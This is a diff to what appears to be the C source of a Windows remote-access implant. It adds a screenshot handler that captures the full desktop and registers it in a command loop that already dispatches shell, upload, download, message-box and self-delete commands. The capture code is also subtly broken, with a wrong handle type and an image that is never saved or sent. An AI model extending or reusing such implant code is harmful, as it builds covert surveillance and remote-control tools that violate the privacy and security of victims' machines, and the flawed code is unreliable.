@@ -306,10 +306,24 @@ cleanup:
         log_info("Successfully downloaded the file.");
 }
 
+void handle_screenshot()
+{
+    int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    HDC desktop = GetDC(NULL);
+    BITMAP src_bitmap = CreateCompatibleBitmap(desktop, screen_width, screen_height);
+    HDC dst_bitmap = CreateCompatibleDC(desktop);
+
+    SelectObject(dst_bitmap, src_bitmap);
+    BitBlt(dst_bitmap, 0, 0, screen_width, screen_height, desktop, 0, 0, SRCCOPY);
+    ReleaseDC(NULL, desktop);
+    DeleteDC(dst_bitmap);
+}
+
 void listen_for_cmds()
 {
     struct cmd cmd = {};
-    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file, handle_screenshot};
 
     while (TRUE)
     {
